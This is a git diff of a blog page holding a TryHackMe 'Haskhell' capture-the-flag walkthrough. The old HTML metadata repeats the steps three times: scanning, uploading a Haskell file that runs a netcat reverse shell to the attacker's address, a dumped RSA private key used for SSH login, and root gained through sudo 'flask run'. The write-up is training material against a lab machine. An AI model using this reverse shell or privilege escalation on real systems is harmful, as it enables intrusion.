@@ -1,603 +1,523 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
-<!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>Tryhackme Haskhell | DC0deZer0</title>
-<meta name="generator" content="Jekyll v4.2.0">
-<meta property="og:title" content="Tryhackme Haskhell">
-<meta name="author" content="Jeevan Chandra">
-<meta property="og:locale" content="en_US">
-<meta name="description" content="Let’s get started Nmap Scan. nmap -sV -sC -Pn -p- -T4 hask.thm Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 03:30 EDT Nmap scan report for hask.thm (10.10.129.213) Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA) | 256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA) |_ 256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519) 5001/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Homepage Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 657.29 seconds From the Nmap scan I can see that port 5001 is the only useful port that can be enumerated. Having a look on the http site @ 5001 I come to see this page Seeing the hyperlink homework here I clicked on it and it took me to the page where an assignment can be submitted. Clicking on the submit button it says that PAGE NOT FOUND. Using Gobuster to find the directories of the machine. Gobuster root@Ac3:~# gobuster dir -u http://hask.thm:5001/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://hask.thm:5001/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/07/08 03:33:08 Starting gobuster =============================================================== /submit (Status: 200) =============================================================== 2020/07/08 03:36:03 Finished =============================================================== So it’s not uploads but it’s Submit. Tried a bunch of stuff like uploading a PHP shell and stuff like that, but nothing seems to be working. Remembering from previous pages this site probably accepts a haskell scripts. Reverse shell A little bit research on haskell I found that we can call a command using the below script. root@Ac3:~/Haskhell# cat shell.hs module Main where import System.Process main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f&quot; Uploading the file and starting up a listner nc -lnvp 5566 and visiting the url hask.thm/uploads/shell.hs gave me the reverse shell. root@Ac3:~/Haskhell# nc -lnvp 5566 listening on [any] 5566 ... connect to [10.9.2.148] from (UNKNOWN) [10.10.129.213] 44224 /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(flask) gid=1001(flask) groups=1001(flask) $ We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. Getting User.txt flask@haskhell:/home$ ls flask haskell prof flask@haskhell:/home$ flask@haskhell:/home$ cd prof cd prof flask@haskhell:/home/prof$ ls ls __pycache__ user.txt flask@haskhell:/home/prof$ cat user.txt cat user.txt flag{--------------} From here I see a .ssh folder which contains the id_rsa of professor, So I copied that to my kali and used ssh to login as prof. flask@haskhell:/home/prof/.ssh$ cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++ 6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr 7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2 o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67 54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2 kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY 3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U /cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S /+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA== -----END RSA PRIVATE KEY----- SSH to Prof root@Ac3:~/Haskhell# ssh -i id_rsa prof@hask.thm The authenticity of host 'hask.thm (10.10.129.213)' can't be established. ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'hask.thm,10.10.129.213' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 8 08:06:37 UTC 2020 System load: 0.0 Processes: 108 Usage of /: 26.3% of 19.56GB Users logged in: 0 Memory usage: 48% IP address for eth0: 10.10.129.213 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Wed May 27 18:45:06 2020 from 192.168.126.128 $ id uid=1002(prof) gid=1002(prof) groups=1002(prof) We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. $ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' prof@haskhell:~$ Checking the priv of prof prof@haskhell:~$ sudo -l Matching Defaults entries for prof on haskhell: env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User prof may run the following commands on haskhell: (root) NOPASSWD: /usr/bin/flask run Privilege Escalation prof@haskhell:~$ nano root.py import os os.system(&quot;/bin/sh&quot;) prof@haskhell:~$ nano root.py prof@haskhell:~$ export FLASK_APP=root.py prof@haskhell:~$ sudo flask run # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt flag{*****************} If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
-<meta property="og:description" content="Let’s get started Nmap Scan. nmap -sV -sC -Pn -p- -T4 hask.thm Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 03:30 EDT Nmap scan report for hask.thm (10.10.129.213) Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA) | 256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA) |_ 256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519) 5001/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Homepage Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 657.29 seconds From the Nmap scan I can see that port 5001 is the only useful port that can be enumerated. Having a look on the http site @ 5001 I come to see this page Seeing the hyperlink homework here I clicked on it and it took me to the page where an assignment can be submitted. Clicking on the submit button it says that PAGE NOT FOUND. Using Gobuster to find the directories of the machine. Gobuster root@Ac3:~# gobuster dir -u http://hask.thm:5001/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://hask.thm:5001/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/07/08 03:33:08 Starting gobuster =============================================================== /submit (Status: 200) =============================================================== 2020/07/08 03:36:03 Finished =============================================================== So it’s not uploads but it’s Submit. Tried a bunch of stuff like uploading a PHP shell and stuff like that, but nothing seems to be working. Remembering from previous pages this site probably accepts a haskell scripts. Reverse shell A little bit research on haskell I found that we can call a command using the below script. root@Ac3:~/Haskhell# cat shell.hs module Main where import System.Process main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f&quot; Uploading the file and starting up a listner nc -lnvp 5566 and visiting the url hask.thm/uploads/shell.hs gave me the reverse shell. root@Ac3:~/Haskhell# nc -lnvp 5566 listening on [any] 5566 ... connect to [10.9.2.148] from (UNKNOWN) [10.10.129.213] 44224 /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(flask) gid=1001(flask) groups=1001(flask) $ We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. Getting User.txt flask@haskhell:/home$ ls flask haskell prof flask@haskhell:/home$ flask@haskhell:/home$ cd prof cd prof flask@haskhell:/home/prof$ ls ls __pycache__ user.txt flask@haskhell:/home/prof$ cat user.txt cat user.txt flag{--------------} From here I see a .ssh folder which contains the id_rsa of professor, So I copied that to my kali and used ssh to login as prof. flask@haskhell:/home/prof/.ssh$ cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++ 6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr 7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2 o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67 54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2 kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY 3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U /cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S /+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA== -----END RSA PRIVATE KEY----- SSH to Prof root@Ac3:~/Haskhell# ssh -i id_rsa prof@hask.thm The authenticity of host 'hask.thm (10.10.129.213)' can't be established. ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'hask.thm,10.10.129.213' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 8 08:06:37 UTC 2020 System load: 0.0 Processes: 108 Usage of /: 26.3% of 19.56GB Users logged in: 0 Memory usage: 48% IP address for eth0: 10.10.129.213 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Wed May 27 18:45:06 2020 from 192.168.126.128 $ id uid=1002(prof) gid=1002(prof) groups=1002(prof) We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. $ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' prof@haskhell:~$ Checking the priv of prof prof@haskhell:~$ sudo -l Matching Defaults entries for prof on haskhell: env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User prof may run the following commands on haskhell: (root) NOPASSWD: /usr/bin/flask run Privilege Escalation prof@haskhell:~$ nano root.py import os os.system(&quot;/bin/sh&quot;) prof@haskhell:~$ nano root.py prof@haskhell:~$ export FLASK_APP=root.py prof@haskhell:~$ sudo flask run # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt flag{*****************} If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
-<link rel="canonical" href="https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html">
-<meta property="og:url" content="https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html">
-<meta property="og:site_name" content="DC0deZer0">
-<meta property="og:image" content="https://jeevanachandra.github.io//assets/img/sample/hask/hask.png">
-<meta property="og:type" content="article">
-<meta property="article:published_time" content="2020-07-08T15:04:00+05:30">
-<meta name="twitter:card" content="summary_large_image">
-<meta property="twitter:image" content="https://jeevanachandra.github.io//assets/img/sample/hask/hask.png">
-<meta property="twitter:title" content="Tryhackme Haskhell">
-<script type="application/ld+json">
-{"mainEntityOfPage":{"@type":"WebPage","@id":"https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html"},"description":"Let’s get started Nmap Scan. nmap -sV -sC -Pn -p- -T4 hask.thm Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 03:30 EDT Nmap scan report for hask.thm (10.10.129.213) Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA) | 256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA) |_ 256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519) 5001/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Homepage Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 657.29 seconds From the Nmap scan I can see that port 5001 is the only useful port that can be enumerated. Having a look on the http site @ 5001 I come to see this page Seeing the hyperlink homework here I clicked on it and it took me to the page where an assignment can be submitted. Clicking on the submit button it says that PAGE NOT FOUND. Using Gobuster to find the directories of the machine. Gobuster root@Ac3:~# gobuster dir -u http://hask.thm:5001/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://hask.thm:5001/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/07/08 03:33:08 Starting gobuster =============================================================== /submit (Status: 200) =============================================================== 2020/07/08 03:36:03 Finished =============================================================== So it’s not uploads but it’s Submit. Tried a bunch of stuff like uploading a PHP shell and stuff like that, but nothing seems to be working. Remembering from previous pages this site probably accepts a haskell scripts. Reverse shell A little bit research on haskell I found that we can call a command using the below script. root@Ac3:~/Haskhell# cat shell.hs module Main where import System.Process main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f&quot; Uploading the file and starting up a listner nc -lnvp 5566 and visiting the url hask.thm/uploads/shell.hs gave me the reverse shell. root@Ac3:~/Haskhell# nc -lnvp 5566 listening on [any] 5566 ... connect to [10.9.2.148] from (UNKNOWN) [10.10.129.213] 44224 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=1001(flask) gid=1001(flask) groups=1001(flask) $ We can use python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; for a shell upgrade. Getting User.txt flask@haskhell:/home$ ls flask haskell prof flask@haskhell:/home$ flask@haskhell:/home$ cd prof cd prof flask@haskhell:/home/prof$ ls ls __pycache__ user.txt flask@haskhell:/home/prof$ cat user.txt cat user.txt flag{--------------} From here I see a .ssh folder which contains the id_rsa of professor, So I copied that to my kali and used ssh to login as prof. flask@haskhell:/home/prof/.ssh$ cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++ 6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr 7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2 o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67 54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2 kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY 3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U /cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S /+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA== -----END RSA PRIVATE KEY----- SSH to Prof root@Ac3:~/Haskhell# ssh -i id_rsa prof@hask.thm The authenticity of host &#39;hask.thm (10.10.129.213)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;hask.thm,10.10.129.213&#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 8 08:06:37 UTC 2020 System load: 0.0 Processes: 108 Usage of /: 26.3% of 19.56GB Users logged in: 0 Memory usage: 48% IP address for eth0: 10.10.129.213 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Wed May 27 18:45:06 2020 from 192.168.126.128 $ id uid=1002(prof) gid=1002(prof) groups=1002(prof) We can use python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; for a shell upgrade. $ python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; prof@haskhell:~$ Checking the priv of prof prof@haskhell:~$ sudo -l Matching Defaults entries for prof on haskhell: env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User prof may run the following commands on haskhell: (root) NOPASSWD: /usr/bin/flask run Privilege Escalation prof@haskhell:~$ nano root.py import os os.system(&quot;/bin/sh&quot;) prof@haskhell:~$ nano root.py prof@haskhell:~$ export FLASK_APP=root.py prof@haskhell:~$ sudo flask run # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt flag{*****************} If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968","@type":"BlogPosting","image":"https://jeevanachandra.github.io//assets/img/sample/hask/hask.png","headline":"Tryhackme Haskhell","dateModified":"2020-07-08T15:04:00+05:30","datePublished":"2020-07-08T15:04:00+05:30","url":"https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html","author":{"@type":"Person","name":"Jeevan Chandra"},"@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-<link rel="shortcut icon" href="">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
-  <link rel="stylesheet" href="/assets/css/main.css">
-  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="https://jeevanachandra.github.io//feed.xml" title="DC0deZer0">
-<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
-<!-- and it's easy to individually load additional languages -->
-<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Tryhackme Haskhell - D3c0deZ3r0</title>
 
+<meta name="description" content="HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it.Nmap Scan.nmap -sV -sC -Pn -p- -T4 hask.t...">
+<link rel="canonical" href="http://localhost:4000/tryhackme/2020/07/08/Haskhell.html"><link rel="alternate" type="application/rss+xml" title="D3c0deZ3r0" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="manifest" href="/site.webmanifest"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
+<meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet -->
 
 
 
 
+<link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
 
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
 
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
 
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
 
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
 
-
-
-
-
-
-
-
-<script>
-// Init highlight js
-document.addEventListener('DOMContentLoaded', function(event) {
-  var els = document.querySelectorAll('pre code')
-
-  function addLangData(block) {
-    var outer = block.parentElement.parentElement.parentElement;
-    var lang = block.getAttribute('data-lang');
-    for (var i = 0; i < outer.classList.length; i++) {
-      var cls = outer.classList[i];
-      if (cls.startsWith('language-')) {
-        lang = cls;
-        break;
-      }
-    }
-    if (!lang) {
-      cls = block.getAttribute('class');
-      lang = cls ? cls.replace('hljs ', '') : '';
-    }
-    if (lang.startsWith('language-')) {
-      lang = lang.substr(9);
-    }
